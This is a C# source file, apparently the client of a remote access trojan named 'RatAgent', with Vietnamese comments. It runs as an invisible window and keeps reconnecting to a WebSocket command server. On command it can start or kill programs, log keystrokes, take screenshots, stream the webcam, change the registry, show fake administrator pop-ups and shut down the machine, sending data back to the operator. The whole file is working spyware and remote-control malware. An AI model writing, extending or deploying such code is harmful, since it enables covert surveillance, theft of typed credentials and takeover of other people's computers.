using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32; // QUAN TRỌNG: Để dùng Registry
using AForge.Video;
using AForge.Video.DirectShow;

namespace RatAgent
{
    public partial class AgentForm : Form
    {
        private ClientWebSocket _ws;
        // Đổi IP này thành IP máy chạy Node.js
        private readonly string GATEWAY_URL = "ws://localhost:8080";
        private readonly string MY_ID = Environment.MachineName;
        private FilterInfoCollection videoDevices;
        private VideoCaptureDevice videoSource;
        private bool isWebcamRunning = false;
        private DateTime lastFrameTime = DateTime.MinValue;

        public AgentForm()
        {
            //InitializeComponent();
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Opacity = 0;
            this.Load += AgentForm_Load;
        }

        private async void AgentForm_Load(object sender, EventArgs e)
        {
            await ConnectGateway();
            // Không tự start Keylog nữa, chờ lệnh từ Admin
        }

        private async Task ConnectGateway()
        {
            while (true)
            {
                try
                {
                    _ws = new ClientWebSocket();
                    _ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(30);
                    await _ws.ConnectAsync(new Uri(GATEWAY_URL), CancellationToken.None);

                    var regData = new { type = "REGISTER", role = "AGENT", id = MY_ID };
                    await SendJsonRaw(regData);
                    await ReceiveLoop();
                }
                catch { await Task.Delay(5000); }
            }
        }

        private async Task ReceiveLoop()
        {
            var buffer = new byte[1024 * 1024]; // 1MB Buffer
            while (_ws.State == WebSocketState.Open)
            {
                try
                {
                    var segment = new ArraySegment<byte>(buffer);
                    WebSocketReceiveResult result;
                    using (var ms = new MemoryStream())
                    {
                        do
                        {
                            result = await _ws.ReceiveAsync(segment, CancellationToken.None);
                            ms.Write(buffer, 0, result.Count);
                        } while (!result.EndOfMessage);

                        if (result.MessageType == WebSocketMessageType.Close) break;

                        ms.Seek(0, SeekOrigin.Begin);
                        string json = Encoding.UTF8.GetString(ms.ToArray());
                        HandleMessage(json);
                    }
                }
                catch { break; }
            }
        }

        private void HandleMessage(string json)
        {
            try
            {
                using (JsonDocument doc = JsonDocument.Parse(json))
                {
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("from", out var fromProp)) return;

                    string requesterId = fromProp.GetString();
                    var payload = root.GetProperty("payload");
                    string cmd = payload.GetProperty("cmd").GetString();
                    string data = payload.TryGetProperty("data", out var d) ? d.GetString() : "";

                    switch (cmd)
                    {
                        // --- PROCESS ---
                        case "GET_PROCESS":
                            var procs = new List<object>();
                            foreach (var p in Process.GetProcesses())
                                try { procs.Add(new { Id = p.Id, Name = p.ProcessName, Threads = p.Threads.Count }); } catch { }
                            _ = ReplyTo(requesterId, "PROCESS_LIST", JsonSerializer.Serialize(procs));
                            break;
                        case "KILL_PROCESS":
                            try { Process.GetProcessById(int.Parse(data)).Kill(); } catch { }
                            break;
                        case "START_PROCESS":
                            try { Process.Start(data); } catch { }
                            break;
                        case "SHOW_MSG":
                            MessageBox.Show(
                                data,
                                "System Administrator Message",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Warning,
                                MessageBoxDefaultButton.Button1,
                                MessageBoxOptions.ServiceNotification); // ServiceNotification giúp hiện đè lên các app khác
                            ReplyTo(requesterId, "ok", "Da hien thi tin nhan");
                            // Đúng: Vì bên trên bạn đã khai báo string requesterId = fromProp.GetString();
                            break;
                        // --- APPLICATIONS ---
                        case "GET_APPS":
                            var apps = new List<object>();
                            foreach (var p in Process.GetProcesses())
                            {
                                try
                                {
                                    // ĐÂY LÀ ĐIỂM KHÁC BIỆT QUAN TRỌNG GIỮA APPLICATIONS VÀ PROCESSES
                                    // Chỉ lấy những process có Tiêu đề cửa sổ (Giao diện người dùng)
                                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
                                    {
                                        apps.Add(new
                                        {
                                            Id = p.Id,
                                            Name = p.ProcessName,
                                            Title = p.MainWindowTitle // Lấy thêm tiêu đề cửa sổ
                                        });
                                    }
                                }
                                catch { }
                            }
                            _ = ReplyTo(requesterId, "APP_LIST", JsonSerializer.Serialize(apps));
                            break;

                        case "KILL_APP":
                            try
                            {
                                Process.GetProcessById(int.Parse(data)).Kill();
                                // Hoặc muốn tắt nhẹ nhàng (đóng cửa sổ) thì dùng:
                                // Process.GetProcessById(int.Parse(data)).CloseMainWindow();
                            }
                            catch { }
                            break;

                        case "START_APP":
                            try { Process.Start(data); } catch { }
                            break;

                        // --- SCREEN ---
                        case "TAKE_PIC":
                            _ = Task.Run(() => CaptureScreen(requesterId));
                            break;

                        // --- KEYLOG ---
                        case "KEYLOG_HOOK":
                            KeyLogger.Start();
                            _ = ReplyTo(requesterId, "LOG_MSG", "Keylogger đã bật (Hooked).");
                            break;
                        case "KEYLOG_UNHOOK":
                            KeyLogger.Stop();
                            _ = ReplyTo(requesterId, "LOG_MSG", "Keylogger đã tắt (Unhooked).");
                            break;
                        case "KEYLOG_PRINT":
                            string logs = KeyLogger.GetLog();
                            _ = ReplyTo(requesterId, "KEYLOG_DATA", logs);
                            break;
                        case "KEYLOG_CLEAR":
                            KeyLogger.ClearLog();
                            _ = ReplyTo(requesterId, "LOG_MSG", "Đã xóa log trên máy Agent.");
                            break;

                        // --- REGISTRY ---
                        case "REG_ACTION":
                            // Data dạng JSON string: { Action: "SET", Root: "HKCU", Path: "...", Name: "...", Value: "...", Type: "..." }
                            _ = Task.Run(() => HandleRegistry(requesterId, data));
                            break;

                        // --- SYSTEM ---
                        case "SHUTDOWN":
                            Process.Start("shutdown", "/s /t 0");
                            break;

                        case "RESTART":
                            Process.Start("shutdown", "/r /t 0");
                            break;
                        // --- WEBCAM ---
                        case "WEBCAM_START":
                            StartWebcam(requesterId);
                            break;

                        case "WEBCAM_STOP":
                            StopWebcam();
                            _ = ReplyTo(requesterId, "LOG_MSG", "Đã tắt Webcam.");
                            break;
                    }
                }
            }
            catch { }
        }

        private async Task HandleRegistry(string requesterId, string jsonPayload)
        {
            try
            {
                var options = JsonSerializer.Deserialize<Dictionary<string, string>>(jsonPayload);
                string action = options["Action"];
                string root = options["Root"];
                string path = options["Path"];
                string name = options.ContainsKey("Name") ? options["Name"] : "";

                RegistryKey baseKey = root switch
                {
                    "HKEY_CLASSES_ROOT" => Registry.ClassesRoot,
                    "HKEY_CURRENT_USER" => Registry.CurrentUser,
                    "HKEY_LOCAL_MACHINE" => Registry.LocalMachine,
                    "HKEY_USERS" => Registry.Users,
                    _ => null
                };

                if (baseKey == null) return;

                string resultMsg = "Thất bại";

                if (action == "CREATE_KEY")
                {
                    baseKey.CreateSubKey(path);
                    resultMsg = "Đã tạo Key thành công";
                }
                else if (action == "DELETE_KEY")
                {
                    baseKey.DeleteSubKeyTree(path, false);
                    resultMsg = "Đã xóa Key";
                }
                else
                {
                    // Các thao tác cần mở Key
                    using (RegistryKey subKey = baseKey.OpenSubKey(path, true))
                    {
                        if (subKey != null)
                        {
                            if (action == "GET_VALUE")
                            {
                                object val = subKey.GetValue(name);
                                resultMsg = val != null ? val.ToString() : "(null)";
                            }
                            else if (action == "DELETE_VALUE")
                            {
                                subKey.DeleteValue(name, false);
                                resultMsg = "Đã xóa Value";
                            }
                            else if (action == "SET_VALUE")
                            {
                                string valStr = options["Value"];
                                string type = options["Type"];
                                RegistryValueKind kind = RegistryValueKind.String;
                                object valData = valStr;

                                switch (type)
                                {
                                    case "DWORD":
                                        kind = RegistryValueKind.DWord;
                                        valData = int.Parse(valStr);
                                        break;
                                    case "Binary":
                                        kind = RegistryValueKind.Binary;
                                        // Giả sử input là hex string, ở đây demo đơn giản coi là string
                                        break;
                                }
                                subKey.SetValue(name, valData, kind);
                                resultMsg = "Đã set giá trị thành công";
                            }
                        }
                        else resultMsg = "Không tìm thấy đường dẫn Key";
                    }
                }
                await ReplyTo(requesterId, "REG_RESULT", resultMsg);
            }
            catch (Exception ex)
            {
                await ReplyTo(requesterId, "REG_RESULT", "Lỗi Registry: " + ex.Message);
            }
        }

        private async Task CaptureScreen(string requesterId)
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
                using (Graphics g = Graphics.FromImage(bmp))
                using (MemoryStream ms = new MemoryStream())
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    bmp.Save(ms, ImageFormat.Png);
                    string base64 = Convert.ToBase64String(ms.ToArray());
                    await ReplyTo(requesterId, "PIC_DATA", base64);
                }
            }
            catch { }
        }

        // --- HÀM XỬ LÝ WEBCAM ---

        private void StartWebcam(string requesterId)
        {
            if (isWebcamRunning) return;

            try
            {
                // 1. Lấy danh sách thiết bị video
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                if (videoDevices.Count == 0)
                {
                    _ = ReplyTo(requesterId, "LOG_MSG", "Lỗi: Không tìm thấy Webcam!");
                    return;
                }

                // 2. Chọn thiết bị đầu tiên (Index 0)
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                // 3. Đăng ký sự kiện: "Mỗi khi có ảnh mới thì làm gì?"
                videoSource.NewFrame += (s, e) => VideoSource_NewFrame(s, e, requesterId);

                // 4. Bắt đầu chạy
                videoSource.Start();
                isWebcamRunning = true;
                _ = ReplyTo(requesterId, "LOG_MSG", "Webcam đang chạy...");
            }
            catch (Exception ex)
            {
                _ = ReplyTo(requesterId, "LOG_MSG", "Lỗi Webcam: " + ex.Message);
            }
        }

        private void StopWebcam()
        {
            if (videoSource != null && videoSource.IsRunning)
            {
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                videoSource = null;
            }
            isWebcamRunning = false;
        }

        // --- BỘ ĐẾM & GỬI ẢNH (Hàm này chạy liên tục mỗi khi có Frame mới) ---
        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs, string targetId)
        {
            try
            {
                // Giới hạn tốc độ gửi (Ví dụ: tối đa 10 FPS để tránh nghẽn mạng)
                // Nếu muốn mượt nhất có thể thì bỏ dòng if này đi
                if ((DateTime.Now - lastFrameTime).TotalMilliseconds < 100) return;
                lastFrameTime = DateTime.Now;

                // 1. Lấy ảnh từ Webcam (Bitmap gốc)
                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
                {
                    // 2. Resize ảnh nhỏ lại (320px width) để gửi cho nhanh
                    // Nếu để HD sẽ rất lag
                    int newWidth = 320;
                    int newHeight = (int)((float)original.Height / original.Width * newWidth);

                    using (Bitmap resized = new Bitmap(original, newWidth, newHeight))
                    using (MemoryStream ms = new MemoryStream())
                    {
                        // 3. Nén JPEG chất lượng 50%
                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                        System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 50L); // 50% Quality

                        resized.Save(ms, jpgEncoder, myEncoderParameters);

                        // 4. Chuyển sang Base64 và Gửi
                        string base64 = Convert.ToBase64String(ms.ToArray());

                        // Lưu ý: Gọi hàm gửi async từ sự kiện sync
                        _ = ReplyTo(targetId, "WEBCAM_FRAME", base64);
                    }
                }
            }
            catch { }
        }

        // Hàm phụ trợ lấy Encoder cho JPEG
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid) return codec;
            }
            return null;
        }

        private async Task ReplyTo(string targetId, string cmd, string data)
        {
            var packet = new { targetId = targetId, payload = new { cmd = cmd, data = data } };
            await SendJsonRaw(packet);
        }

        private async Task SendJsonRaw(object data)
        {
            if (_ws.State == WebSocketState.Open)
            {
                string json = JsonSerializer.Serialize(data);
                var bytes = Encoding.UTF8.GetBytes(json);
                await _ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
            }
        }

        private void AgentForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopWebcam();
            KeyLogger.Stop();
        }
    }
}